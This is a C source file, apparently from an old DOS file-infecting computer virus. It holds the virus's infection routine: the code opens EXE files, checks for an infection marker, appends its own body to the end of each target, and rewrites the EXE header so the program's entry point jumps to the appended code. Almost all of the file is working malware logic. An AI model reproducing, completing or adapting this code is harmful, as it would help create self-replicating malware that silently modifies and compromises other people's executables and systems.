

 /* VV.C file contains special critical code */
 #pragma inline
 #include"v.h"
 
 extern void startx(void);

 unsigned long pres_off(struct EXEheader *);
 int infect( int handle );

 int modify(char * name)
 {
 int handle,res;
 if((handle =_open(name,O_RDWR)) == -1)  return -1;
 res = infect(handle);
 close(handle);
 return res;
 }

 int infect( int handle )
 {
 /* returns 1 if successfully
    -1 if failed
    0 to continue		*/
 struct EXEheader Header;
 long len;

 if(read(handle,&Header,sizeof(Header)) == -1) return -1;
 if(Header.Overlay) return 0;

/*------------ calculate offset to read presence password------------*/
	{ int pres_buf;
	  if(lseek(handle,pres_off(&Header),SEEK_SET) == -1) return -1;
	  if(read(handle,&pres_buf,sizeof(pres_buf)) == -1) return -1;
	  if(pres_buf == presence)  return 0; /* modified */
	}

/*---------------- check stack --------------------------------------*/

	{
	  if((len = lseek(handle,0,SEEK_END)) == -1L) return -1;
	  if((unsigned long)len + (unsigned)&end_of_program + 200u\
	  > 16uL*(Header.HdrSize + Header.ReloSS) + Header.ExeSP)
	  return 0;
	}
/*-------------- check length ---------------------------------------*/

     if(len > 300000) return -1;	/* too big */

/*-------------- prepare to modify immediately ----------------------*/

	OEP =  MK_FP(Header.ReloCS,Header.ExeIP);

NRCS =  ((unsigned long)len - 16uL*(Header.HdrSize) + sizeof(Header))/16u;
 if((OldFileLength = filelength(handle)) == -1) return -1;

	{
  if(write(handle,&Header,sizeof(Header)) != sizeof(Header)) return -1;
	  if(lseek(handle, /* new len - don't destroy! */
	  (len = tell(handle) & ~0x0F),SEEK_SET) == -1L)
	  return -1;
		/* WRITE TO END OF FILE !!! */
  if(write(handle,0,(unsigned int) &end_of_program) != \
 (unsigned)&end_of_program)
	  return -1;
	}
/*----------------------- set new entry point -----------------------*/
	{
	Header.ReloCS = ((unsigned long)len - 16uL*(Header.HdrSize))/16u;
	Header.ExeIP = (unsigned)startx;
	}
	{
	 unsigned long size;	/* auxillary */
	if(( size = tell(handle)) == -1) return -1;
	Header.PageCnt = 1 + (unsigned)(size/512u);
	Header.PartPag = ((unsigned)size & 511);
	if(Header.MinMem < 128) Header.MinMem += 128;
	}
/*------------------------ write header ! ---------------------------*/
	{
	if(lseek(handle,0,SEEK_SET) == -1L) return -1;
if(write(handle,&Header,sizeof(Header)) != sizeof(Header)) return -1;
	puts("Successfully");
	}

return 1;
}

 unsigned long pres_off(struct EXEheader *h)
 { return 16uL*(h->ReloCS + h->HdrSize) + (unsigned int)&presence; }

